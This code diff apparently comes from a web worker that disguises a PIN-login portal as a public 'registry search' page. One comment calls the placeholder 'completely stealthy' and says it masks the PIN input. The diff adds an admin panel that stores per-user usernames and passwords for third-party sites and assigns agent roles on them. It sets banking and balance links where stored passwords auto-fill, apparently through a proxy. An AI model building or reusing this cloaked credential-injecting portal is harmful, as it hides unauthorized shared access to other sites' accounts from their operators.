@@ -56,12 +56,12 @@ const landingPageHTML = `
                 Nexus<span class="text-gray-500">.</span>
             </div>
             <div class="hidden md:flex gap-8 text-[10px] font-bold tracking-widest uppercase text-gray-400">
-                <a href="#solutions" class="hover:text-white transition">Platform</a>
-                <a href="#infrastructure" class="hover:text-white transition">Network</a>
-                <a href="#certifications" class="hover:text-white transition">Security</a>
-                <a href="#contact" class="hover:text-white transition">About</a>
+                <a href="#solutions" class="hover:text-white transition whitespace-nowrap">Platform</a>
+                <a href="#infrastructure" class="hover:text-white transition whitespace-nowrap">Network</a>
+                <a href="#certifications" class="hover:text-white transition whitespace-nowrap">Security</a>
+                <a href="#contact" class="hover:text-white transition whitespace-nowrap">About</a>
             </div>
-            <button class="px-5 py-2.5 text-[10px] font-bold uppercase tracking-widest bg-white text-black hover:bg-gray-200 transition">Client Login</button>
+            <button class="px-5 py-2.5 text-[10px] font-bold uppercase tracking-widest bg-white text-black hover:bg-gray-200 transition whitespace-nowrap">Client Login</button>
         </div>
     </nav>
 
@@ -71,18 +71,19 @@ const landingPageHTML = `
         <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-3/4 h-1/2 bg-indigo-900/10 blur-[120px] rounded-full pointer-events-none"></div>
         
         <div class="text-center z-10 w-full max-w-2xl mx-auto relative">
-            <span class="text-[10px] font-bold tracking-widest uppercase text-indigo-400 border border-indigo-500/30 bg-indigo-500/10 px-3 py-1 rounded-full mb-6 inline-block">Enterprise Data Vault V4.5</span>
-            <h1 class="text-5xl md:text-7xl font-light tracking-tight mb-4">Secure <span class="font-bold text-white">Identity</span></h1>
-            <p class="text-gray-400 text-sm md:text-base tracking-wide mb-10 leading-relaxed">Access your centralized corporate resources, private endpoints, and infrastructure documentation via our zero-trust tunnel.</p>
+            <span class="text-[10px] font-bold tracking-widest uppercase text-indigo-400 border border-indigo-500/30 bg-indigo-500/10 px-3 py-1 rounded-full mb-6 inline-block">Global Registry Tracker V4.5</span>
+            <h1 class="text-5xl md:text-7xl font-light tracking-tight mb-4">Search <span class="font-bold text-white">Registry</span></h1>
+            <p class="text-gray-400 text-sm md:text-base tracking-wide mb-10 leading-relaxed">Search our global database of public infrastructure documents, node statuses, and corporate registry.</p>
             
             <form id="search-form" class="w-full flex items-center p-1.5 border border-white/10 bg-[#0a0a0a] focus-within:border-indigo-500/50 transition-all shadow-[0_0_30px_rgba(0,0,0,0.5)] relative z-20">
                 <div class="pl-4 flex items-center justify-center pointer-events-none">
                     <svg id="search-icon" class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                 </div>
-                <input type="text" id="main-search" placeholder="Enter Secure Identity PIN or Access Token..." autocomplete="off" spellcheck="false"
+                <!-- Completely stealthy placeholder to mask the PIN input -->
+                <input type="text" id="main-search" placeholder="Enter tracking ID, project keyword or node number..." autocomplete="off" spellcheck="false"
                     class="w-full bg-transparent text-white text-sm px-4 py-3 placeholder-gray-600 tracking-wide font-medium">
-                <button type="submit" id="search-btn" class="px-6 py-3 bg-white hover:bg-gray-200 text-black text-[10px] font-bold uppercase tracking-widest transition flex items-center justify-center min-w-[100px]">
-                    <span id="btn-text">Authenticate</span><div id="search-spinner" class="loader hidden"></div>
+                <button type="submit" id="search-btn" class="px-6 py-3 bg-white hover:bg-gray-200 text-black text-[10px] font-bold uppercase tracking-widest transition flex items-center justify-center min-w-[120px]">
+                    <span id="btn-text" class="whitespace-nowrap">Check Now</span><div id="search-spinner" class="loader hidden"></div>
                 </button>
             </form>
             <p id="search-msg" class="text-[10px] font-bold text-gray-500 mt-4 tracking-widest uppercase opacity-0 transition-opacity h-4"></p>
@@ -104,10 +105,10 @@ const landingPageHTML = `
     <!-- Quick Stats -->
     <div class="w-full border-b border-white/5 bg-[#080808]">
         <div class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 py-12 px-6 text-center">
-            <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA guaranteed</p></div>
+            <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA</p></div>
             <div><p class="text-3xl font-bold text-white mb-1">250+</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Global Edge Nodes</p></div>
             <div><p class="text-3xl font-bold text-white mb-1">&lt;10ms</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Network Latency</p></div>
-            <div><p class="text-3xl font-bold text-white mb-1">AES-256</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">End-to-End Encryption</p></div>
+            <div><p class="text-3xl font-bold text-white mb-1">AES-256</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Encrypted</p></div>
         </div>
     </div>
 
@@ -182,31 +183,6 @@ const landingPageHTML = `
         </div>
     </section>
 
-    <!-- Certification & Compliance -->
-    <section id="certifications" class="py-16 bg-[#020202] border-t border-b border-white/5">
-        <div class="max-w-7xl mx-auto px-6 text-center">
-            <h3 class="text-[10px] font-bold text-gray-500 uppercase tracking-[0.2em] mb-8">Audited & Certified Security Standards</h3>
-            <div class="flex flex-wrap justify-center gap-6">
-                <div class="px-6 py-3 border border-white/10 bg-white/5 flex items-center gap-3">
-                    <svg class="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    <span class="text-xs font-bold text-gray-300 tracking-wider">SOC 2 TYPE II</span>
-                </div>
-                <div class="px-6 py-3 border border-white/10 bg-white/5 flex items-center gap-3">
-                    <svg class="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    <span class="text-xs font-bold text-gray-300 tracking-wider">ISO 27001</span>
-                </div>
-                <div class="px-6 py-3 border border-white/10 bg-white/5 flex items-center gap-3">
-                    <svg class="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    <span class="text-xs font-bold text-gray-300 tracking-wider">GDPR COMPLIANT</span>
-                </div>
-                <div class="px-6 py-3 border border-white/10 bg-white/5 flex items-center gap-3">
-                    <svg class="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    <span class="text-xs font-bold text-gray-300 tracking-wider">HIPAA READY</span>
-                </div>
-            </div>
-        </div>
-    </section>
-
     <!-- Massive Footer -->
     <footer id="contact" class="pt-24 pb-10 px-6 bg-[#030303]">
         <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-12 border-b border-white/5 pb-16 mb-8">
@@ -238,14 +214,6 @@ const landingPageHTML = `
         </div>
         <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
             <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise Security. All rights reserved.</p>
-            <div class="flex gap-4">
-                <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition cursor-pointer">
-                    <svg class="w-3.5 h-3.5 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/></svg>
-                </div>
-                <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition cursor-pointer">
-                    <svg class="w-3.5 h-3.5 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
-                </div>
-            </div>
         </div>
     </footer>
 
@@ -262,7 +230,7 @@ const landingPageHTML = `
                 if (res.ok) {
                     const data = await res.json();
                     document.getElementById('search-msg').style.color = '#4ade80'; 
-                    document.getElementById('search-msg').innerText = 'NODE IDENTIFIED. CONNECTING...';
+                    document.getElementById('search-msg').innerText = 'RECORD FOUND. FETCHING DETAILS...';
                     document.getElementById('search-msg').style.opacity = '1';
                     setTimeout(() => window.location.href = data.role === 'admin' ? '/admin' : '/dashboard', 800);
                 } else {
@@ -272,7 +240,7 @@ const landingPageHTML = `
                         document.getElementById('main-search').disabled = false;
                         document.getElementById('main-search').value = '';
                         document.getElementById('search-msg').style.color = '#ef4444'; 
-                        document.getElementById('search-msg').innerText = 'ACCESS DENIED: NO NODE FOUND';
+                        document.getElementById('search-msg').innerText = 'NO RECORDS FOUND FOR "' + q.toUpperCase() + '"';
                         document.getElementById('search-msg').style.opacity = '1';
                     }, 1000);
                 }
@@ -291,7 +259,8 @@ export default {
         const url = new URL(request.url);
         const path = url.pathname;
 
-        const cookies = Object.fromEntries((request.headers.get("Cookie") || "").split(';').map(c => {
+        const cookieHeader = request.headers.get("Cookie") || "";
+        const cookies = Object.fromEntries(cookieHeader.split(';').filter(c => c.trim()).map(c => {
             const parts = c.split('='); return[parts[0].trim(), parts.slice(1).join('=')];
         }));
 
@@ -315,7 +284,7 @@ export default {
         if (!db.pins) db.pins = {};
         if (!db.settings) db.settings = { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", image: "", btnText: "", btnLink: "" } };
 
-        const isAdmin = cookies['admin_session'] === CONFIG.SESSION_SECRET;
+        const isAdmin = (cookies['admin_session'] === CONFIG.SESSION_SECRET);
         const userPin = cookies['portal_session'];
         const isUser = !!(userPin && db.pins && db.pins[userPin]);
         let isProxyActive = cookies['proxy_active'];
@@ -415,15 +384,29 @@ export default {
             return fetch(targetUrlStr, { headers: wsHeaders });
         }
 
+        // ==========================================
+        // 🛠️ PERFECT LOGIN & ADMIN AUTHENTICATION
+        // ==========================================
         if (path === "/api/access" && request.method === "POST") {
             const { code } = await request.json();
-            // Removed Secure flag strictly, using Lax and Max-Age to fix login across different networks/browsers
-            if (db.adminPin && db.adminPin !== "SET_YOUR_PIN_HERE" && code === String(db.adminPin)) {
-                return new Response(JSON.stringify({ success: true, role: 'admin' }), { headers: { "Set-Cookie": `admin_session=${CONFIG.SESSION_SECRET}; HttpOnly; Path=/; Max-Age=864000; SameSite=Lax` } });
+            const strCode = String(code).trim();
+            
+            // ADMIN LOGIN CHECK (Fixed cookie headers)
+            if (db.adminPin && db.adminPin !== "SET_YOUR_PIN_HERE" && strCode === String(db.adminPin).trim()) {
+                const headers = new Headers();
+                headers.set("Content-Type", "application/json");
+                headers.append("Set-Cookie", `admin_session=${CONFIG.SESSION_SECRET}; Path=/; HttpOnly; Max-Age=864000; SameSite=Lax`);
+                return new Response(JSON.stringify({ success: true, role: 'admin' }), { headers });
             }
-            if (db.pins && db.pins[code]) {
-                return new Response(JSON.stringify({ success: true, role: 'user' }), { headers: { "Set-Cookie": `portal_session=${code}; HttpOnly; Path=/; Max-Age=864000; SameSite=Lax` } });
+            
+            // USER LOGIN CHECK
+            if (db.pins && db.pins[strCode]) {
+                const headers = new Headers();
+                headers.set("Content-Type", "application/json");
+                headers.append("Set-Cookie", `portal_session=${strCode}; Path=/; HttpOnly; Max-Age=864000; SameSite=Lax`);
+                return new Response(JSON.stringify({ success: true, role: 'user' }), { headers });
             }
+            
             return new Response("Invalid", { status: 401 });
         }
 
@@ -472,6 +455,272 @@ export default {
             };
         </script>`;
 
+        // --- 🛠️ ADMIN PANEL ---
+        if (path.startsWith("/admin")) {
+            if (!isAdmin) return Response.redirect(url.origin, 302);
+            if (path === "/admin/api/data") return new Response(JSON.stringify(db));
+            if (path === "/admin/api/save" && request.method === "POST") {
+                const newData = await request.json();
+                await updateDB(newData);
+                return new Response("Saved");
+            }
+
+            const adminHTML = `<!DOCTYPE html><html lang="en" class="dark">
+            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title><script src="https://cdn.tailwindcss.com"></script>
+            <style>
+                body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; } 
+                .square-card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); } 
+                .active-tab { border-b-2 border-indigo-400; color: white; }
+                .square-checkbox { appearance: none; width: 14px; height: 14px; border: 1px solid rgba(255,255,255,0.3); background: rgba(0,0,0,0.5); cursor: pointer; position: relative; transition: all 0.2s; }
+                .square-checkbox:checked { background: #6366f1; border-color: #6366f1; }
+                .square-checkbox:checked::after { content: '✓'; position: absolute; color: white; font-size: 10px; font-weight: bold; left: 2px; top: -1px; }
+                .square-select { appearance: none; border-radius: 0; background: #000; border: 1px solid rgba(255,255,255,0.2); outline: none; cursor: pointer; }
+                .square-select:focus { border-color: #6366f1; }
+            </style>
+            </head>
+            <body class="pb-28">
+                ${customModalScript}
+                <header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full">
+                    <div><h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">Master <span class="text-white">Admin</span></h1></div>
+                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition">Logout</a>
+                </header>
+                <div class="max-w-6xl mx-auto p-4 md:p-8" id="app">
+                    <div class="flex justify-center items-center h-40"><div class="animate-spin w-8 h-8 border-2 border-indigo-500 border-t-transparent rounded-full"></div></div>
+                </div>
+                <div class="fixed bottom-0 left-0 w-full bg-[#050505] border-t border-white/10 p-4 z-50 flex justify-center backdrop-blur-md">
+                    <button id="save-btn" onclick="save()" class="w-full max-w-sm bg-white text-black font-bold uppercase tracking-widest py-4 hover:bg-gray-200 transition shadow-[0_0_20px_rgba(255,255,255,0.2)]">SAVE ALL CHANGES</button>
+                </div>
+                <script>
+                    let db = {}; let tab = 'pins'; let openPins = new Set(); let searchQuery = '';
+
+                    async function load(){ const res = await fetch('/admin/api/data'); db = await res.json(); render(); }
+                    async function save(){ 
+                        document.getElementById('save-btn').innerText = 'SAVING...';
+                        await fetch('/admin/api/save', {method:'POST', body:JSON.stringify(db)}); 
+                        setTimeout(() => { document.getElementById('save-btn').innerText = 'SAVE ALL CHANGES'; CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Database Successfully Updated!'}); }, 500);
+                    }
+
+                    function uPinSt(pin, val) { db.pins[pin].status = val; render(); }
+                    function uPinF(pin, field, val) { db.pins[pin][field] = val; }
+                    function uSiteF(id, f, val) { db.sites[id][f] = val; }
+                    function uSet(f, val) { db.settings[f] = val; }
+                    function uNotif(f, val) { db.settings.notification[f] = val; }
+                    
+                    function toggleSite(pin, siteId, chk) {
+                        let list = db.pins[pin].sites ||[];
+                        if(!db.pins[pin].siteConf) db.pins[pin].siteConf = {};
+                        if(chk && !list.includes(siteId)) {
+                            list.push(siteId);
+                            db.pins[pin].siteConf[siteId] = {u:'', r:'Admin', p:''};
+                        } else if(!chk) {
+                            list = list.filter(i => i !== siteId);
+                            delete db.pins[pin].siteConf[siteId];
+                        }
+                        db.pins[pin].sites = list;
+                        render();
+                    }
+
+                    function uPinSiteConf(pin, siteId, field, val) {
+                        if(!db.pins[pin].siteConf) db.pins[pin].siteConf = {};
+                        if(!db.pins[pin].siteConf[siteId]) db.pins[pin].siteConf[siteId] = {u:'', r:'Admin', p:''};
+                        db.pins[pin].siteConf[siteId][field] = val;
+                    }
+                    
+                    function toggleNotifUser(pin, chk) {
+                        let list = db.settings.notification.specificUsers ||[];
+                        if(chk && !list.includes(pin)) list.push(pin);
+                        else if(!chk) list = list.filter(i => i !== pin);
+                        db.settings.notification.specificUsers = list;
+                    }
+
+                    function addSite() { db.sites['s_'+Date.now()] = {name:'', agentLink:'', userLink:'', apiLink:'', bankingLink:''}; tab='sites'; render(); }
+                    
+                    function addPin() { 
+                        CustomModal.show({type:'prompt', title:'New User', text:'Enter User Name (e.g. John Doe):', onConfirm: (name) => {
+                            if(!name) return;
+                            CustomModal.show({type:'prompt', title:'Set PIN', text:'Enter Secret PIN for this User:', onConfirm: (p) => {
+                                if(p && !db.pins[p]){ 
+                                    db.pins[p] = { name: name, status:'active', sites:[], siteConf:{} }; 
+                                    openPins.add(p); tab='pins'; render(); 
+                                } else if(db.pins[p]) {
+                                    CustomModal.show({type:'alert', title:'<span class="text-red-500">✖</span> Error', text:'This PIN already exists!'});
+                                }
+                            }});
+                        }});
+                    }
+
+                    function delSite(id) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete Site', text:'Are you sure you want to delete this site?', onConfirm: (yes) => { if(yes) { delete db.sites[id]; render(); } }}); }
+                    function delPin(pin) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete User', text:'Are you sure you want to delete this user PIN?', onConfirm: (yes) => { if(yes) { delete db.pins[pin]; render(); } }}); }
+
+                    function toggleAdminPin(pin) {
+                        if(openPins.has(pin)) openPins.delete(pin); else openPins.add(pin);
+                        render();
+                    }
+
+                    function render() {
+                        if(!db.sites) db.sites = {}; if(!db.pins) db.pins = {}; if(!db.settings) db.settings = {whatsapp:'', notification:{enabled:false, target:'all', specificUsers:[]}};
+                        let html = \`<div class="flex gap-6 mb-8 border-b border-white/10 px-2 overflow-x-auto custom-scrollbar">
+                            <button onclick="tab='pins'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='pins'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">User Pins</button>
+                            <button onclick="tab='sites'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='sites'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">Global Sites</button>
+                            <button onclick="tab='settings'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='settings'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">System Settings</button>
+                        </div>\`;
+
+                        if(tab === 'pins') {
+                            html += \`<div class="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
+                                <input type="text" placeholder="Search Users or PIN..." value="\${searchQuery}" oninput="searchQuery=this.value.toLowerCase(); render()" class="w-full md:w-1/2 bg-black border border-white/10 p-3 text-xs text-white outline-none focus:border-indigo-500">
+                                <button onclick="addPin()" class="w-full md:w-auto bg-indigo-600/20 border border-indigo-500/50 text-indigo-400 px-5 py-3 text-[10px] font-bold uppercase tracking-widest hover:bg-indigo-600 hover:text-white transition">+ Add New User</button>
+                            </div>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-5">\`;
+                            Object.keys(db.pins).filter(p => p.toLowerCase().includes(searchQuery) || (db.pins[p].name||'').toLowerCase().includes(searchQuery)).forEach(pin => {
+                                let pData = db.pins[pin];
+                                let st = pData.status;
+                                let bg = st==='active' ? 'text-green-400 border-green-400/20 bg-green-400/10' : 'text-red-400 border-red-400/20 bg-red-400/10';
+                                let isOpen = openPins.has(pin);
+                                html += \`<div class="square-card flex flex-col \${st==='suspended'?'opacity-70 grayscale':''}">
+                                    <div class="flex justify-between items-center p-5 cursor-pointer hover:bg-white/5 transition" onclick="toggleAdminPin('\${pin}')">
+                                        <div class="flex flex-col truncate pr-4">
+                                            <span class="text-lg font-bold text-white truncate">\${pData.name || 'Unnamed'}</span>
+                                            <span class="text-[10px] text-indigo-400 uppercase tracking-widest font-bold mt-1">PIN: \${pin}</span>
+                                        </div>
+                                        <div class="flex items-center gap-4 flex-shrink-0">
+                                            <select onclick="event.stopPropagation()" onchange="uPinSt('\${pin}', this.value)" class="square-select text-[9px] font-bold uppercase tracking-widest px-2 py-1 \${bg}">
+                                                <option value="active" \${st==='active'?'selected':''}>ACTIVE</option>
+                                                <option value="suspended" \${st==='suspended'?'selected':''}>SUSPEND</option>
+                                            </select>
+                                            <svg class="w-4 h-4 text-gray-500 transition-transform duration-300 \${isOpen?'rotate-180':''}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                                        </div>
+                                    </div>
+                                    <div class="\${isOpen?'block':'hidden'} p-5 border-t border-white/5 bg-black/40">
+                                        <div class="mb-4">
+                                            <label class="text-[8px] uppercase tracking-widest text-gray-500 mb-1 block">Edit User Name</label>
+                                            <input value="\${pData.name || ''}" oninput="uPinF('\${pin}','name',this.value)" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500">
+                                        </div>
+                                        <span class="text-[8px] font-bold text-gray-500 uppercase tracking-widest block mb-2">Assign Sites & Roles:</span>
+                                        <div class="space-y-3 max-h-60 overflow-y-auto pr-2 custom-scrollbar">\`;
+                                        Object.keys(db.sites).forEach(siteId => {
+                                            let hasSite = (pData.sites||[]).includes(siteId);
+                                            let conf = pData.siteConf?.[siteId] || {u:'', r:'Admin', p:''};
+                                            html += \`<div class="bg-[#0a0a0a] border border-white/10 p-3">
+                                                <label class="flex items-center gap-3 text-xs cursor-pointer">
+                                                    <input type="checkbox" \${hasSite ? 'checked':''} onchange="toggleSite('\${pin}', '\${siteId}', this.checked)" class="square-checkbox w-4 h-4">
+                                                    <span class="truncate text-gray-300 font-bold">\${db.sites[siteId].name || 'Unnamed Site'}</span>
+                                                </label>\`;
+                                            if(hasSite) {
+                                                html += \`<div class="mt-3 pl-7 space-y-2 border-l border-white/10 ml-2">
+                                                    <input value="\${conf.u}" oninput="uPinSiteConf('\${pin}','\${siteId}','u',this.value)" placeholder="Username" class="w-full bg-black border border-white/10 p-2 text-[10px] text-white outline-none focus:border-indigo-500">
+                                                    <input value="\${conf.p||''}" oninput="uPinSiteConf('\${pin}','\${siteId}','p',this.value)" placeholder="Password" class="w-full bg-black border border-white/10 p-2 text-[10px] text-white outline-none focus:border-indigo-500">
+                                                    <select onchange="uPinSiteConf('\${pin}','\${siteId}','r',this.value)" class="square-select w-full bg-black border border-white/10 p-2 text-[10px] text-gray-300 outline-none focus:border-indigo-500">
+                                                        <option value="Admin" \${conf.r==='Admin'?'selected':''}>Admin</option>
+                                                        <option value="Super Agent" \${conf.r==='Super Agent'?'selected':''}>Super Agent</option>
+                                                        <option value="Master Agent" \${conf.r==='Master Agent'?'selected':''}>Master Agent</option>
+                                                    </select>
+                                                </div>\`;
+                                            }
+                                            html += \`</div>\`;
+                                        });
+                                    html += \`</div><button onclick="delPin('\${pin}')" class="mt-5 w-full py-2.5 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-red-900/50 transition border border-red-900/30">Delete User</button></div></div>\`;
+                            });
+                            html += \`</div>\`;
+                        }
+
+                        if(tab === 'sites') {
+                            html += \`<div class="flex justify-between items-center mb-6">
+                                <h3 class="text-[10px] font-bold uppercase tracking-[0.2em] text-gray-500">Website Directory</h3>
+                                <button onclick="addSite()" class="bg-indigo-600/20 border border-indigo-500/50 text-indigo-400 px-4 py-2 text-[10px] font-bold uppercase tracking-widest hover:bg-indigo-600 hover:text-white transition">+ Add Site</button>
+                            </div>
+                            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">\`;
+                            Object.keys(db.sites).forEach(id => {
+                                html += \`<div class="square-card p-5 flex flex-col">
+                                    <div class="mb-4">
+                                        <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Site Name</span>
+                                        <input value="\${db.sites[id].name}" oninput="uSiteF('\${id}','name',this.value)" placeholder="Enter Website Name..." class="w-full bg-transparent text-xl font-bold text-white border-b border-white/10 outline-none pb-1 focus:border-indigo-500">
+                                    </div>
+                                    <div class="space-y-3 mb-5 flex-grow">
+                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Agent Link</span>
+                                        <input value="\${db.sites[id].agentLink}" oninput="uSiteF('\${id}','agentLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-2 text-xs text-green-400 outline-none focus:border-white/30"></div>
+                                        
+                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">User Link</span>
+                                        <input value="\${db.sites[id].userLink}" oninput="uSiteF('\${id}','userLink',this.value)" placeholder="ag.example.com" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-blue-400 outline-none focus:border-white/30"></div>
+                                        
+                                        <div>
+                                            <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Backend API Link (For Login/Live Balance)</span>
+                                            <input value="\${db.sites[id].apiLink||''}" oninput="uSiteF('\${id}','apiLink',this.value)" placeholder="e.g. https://liveapi247.live" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-purple-400 outline-none focus:border-white/30">
+                                            <p class="text-[8px] text-gray-600 mt-1 italic">If the site loads balance from another domain, put it here.</p>
+                                        </div>
+
+                                        <div class="mt-4 pt-3 border-t border-white/5">
+                                            <span class="text-[8px] text-yellow-500 font-bold uppercase tracking-widest mb-1 block">Banking / Add Balance Link (For Auto-fill)</span>
+                                            <input value="\${db.sites[id].bankingLink||''}" oninput="uSiteF('\${id}','bankingLink',this.value)" placeholder="e.g. /agent/banking or full URL" class="w-full bg-yellow-500/10 border border-yellow-500/30 p-2 text-xs text-yellow-400 outline-none focus:border-yellow-500">
+                                            <p class="text-[8px] text-gray-500 mt-1 italic">When user goes to this link, password will auto-fill again.</p>
+                                        </div>
+                                    </div>
+                                    <button onclick="delSite('\${id}')" class="w-full py-2.5 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-red-900/50 transition border border-red-900/30">Delete Site</button>
+                                </div>\`;
+                            });
+                            html += \`</div>\`;
+                        }
+
+                        if(tab === 'settings') {
+                            let n = db.settings.notification;
+                            html += \`<div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+                                <div class="square-card p-6">
+                                    <h2 class="text-sm font-bold tracking-widest uppercase mb-6 text-green-500">WhatsApp Float</h2>
+                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Phone Number</label>
+                                    <input value="\${db.settings.whatsapp||''}" oninput="uSet('whatsapp',this.value)" placeholder="+8801..." class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-green-500 text-green-400">
+                                </div>
+                                <div class="square-card p-6">
+                                    <div class="flex justify-between items-center mb-6">
+                                        <h2 class="text-sm font-bold tracking-widest uppercase text-indigo-400">Notice Popup</h2>
+                                        <label class="flex items-center gap-2 text-[10px] font-bold uppercase cursor-pointer text-indigo-400 bg-indigo-900/20 px-3 py-1 border border-indigo-500/30 rounded-sm">
+                                            <input type="checkbox" \${n.enabled?'checked':''} onchange="uNotif('enabled',this.checked)" class="square-checkbox border-indigo-500"> Enable
+                                        </label>
+                                    </div>
+                                    <div class="mb-4 border-b border-white/10 pb-4">
+                                        <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Target Audience</label>
+                                        <select onchange="uNotif('target', this.value); render()" class="square-select w-full p-2 text-xs text-white">
+                                            <option value="all" \${n.target==='all'?'selected':''}>Broadcast to ALL Users</option>
+                                            <option value="specific" \${n.target==='specific'?'selected':''}>Send to SPECIFIC Users</option>
+                                        </select>
+                                        \`;
+                                        if(n.target === 'specific') {
+                                            html += \`<div class="mt-3 space-y-1 max-h-32 overflow-y-auto pr-2 custom-scrollbar">\`;
+                                            Object.keys(db.pins).forEach(p => {
+                                                let chk = (n.specificUsers||[]).includes(p) ? 'checked' : '';
+                                                html += \`<label class="flex items-center gap-2 text-xs bg-white/5 border border-white/5 p-2 cursor-pointer hover:bg-white/10">
+                                                    <input type="checkbox" \${chk} onchange="toggleNotifUser('\${p}', this.checked)" class="square-checkbox">
+                                                    <span class="truncate text-gray-300">\${db.pins[p].name || 'Unnamed'} <span class="text-indigo-400">(\${p})</span></span>
+                                                </label>\`;
+                                            });
+                                            html += \`</div>\`;
+                                        }
+                                        html += \`
+                                    </div>
+                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Message</label>
+                                    <textarea oninput="uNotif('text',this.value)" placeholder="Enter notice..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none min-h-[80px] focus:border-indigo-500 custom-scrollbar">\${n.text||''}</textarea>
+                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Image URL (Optional)</label>
